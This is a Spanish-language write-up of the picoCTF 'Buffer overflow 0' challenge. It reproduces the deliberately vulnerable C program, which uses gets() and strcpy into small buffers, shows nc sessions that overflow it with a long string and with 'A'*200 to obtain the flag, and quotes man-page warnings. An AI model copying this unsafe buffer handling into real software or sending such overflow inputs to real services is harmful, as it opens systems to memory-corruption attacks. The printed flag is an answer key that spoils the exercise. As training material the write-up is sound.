# Buffer overflow 0

## Objetivos
Smash the stack Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/520/vuln). You can view source [here](https://artifacts.picoctf.net/c/520/vuln.c). And connect with it using: `nc saturn.picoctf.net 53935`


## Solución 
```java
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}

```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nc saturn.picoctf.net 53935
Input: steelerssonunequipomuyfregonaunqueahorandenmanvanallegarasercampeonesdelsuperbowlproximamenteasiesxdbatmanyspidermansonlosmejoressuperheroesybuenoyoahoritatengomuchofrioperonimodoasieslavidaymañanajuegamexicoenelmundialdeqatar2020uiuiuiwu8u38ue8uwoueoucuoduosudosufodufosufondjsnjdfggvcgsjdgfhdsjhdgfsjhdfgdhsgfjfhghsgfj
picoCTF{ov3rfl0ws_ar3nt_that_bad_a065d5d9}

```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nc saturn.picoctf.net 53935 <<< $(python3 -c "print('A'*200)")
Input: picoCTF{ov3rfl0ws_ar3nt_that_bad_a065d5d9}


```
## Notas adicionales 
Para este reto tenemos que sobrepasar un buffer, el programa que nos proporcionan hacen uso de gets() y strcpy, usarlos tiene sus advertencias que son lo siguientes:  

man gets :
BUGS
       Never use gets().  Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely
       dangerous to use.  It has been used to break computer security.  Use fgets() instead.


man strcpy:

BUGS
       If the destination string of a strcpy() is not large enough, then anything might happen.  Overflowing fixed-length string buffers is a favorite cracker technique for taking complete control of the machine.  

Entonces una forma es escribir un buffer mas grande de 100 caracteres y de esta forma conseguir la bandera 

https://es.wikipedia.org/wiki/SIGSEGV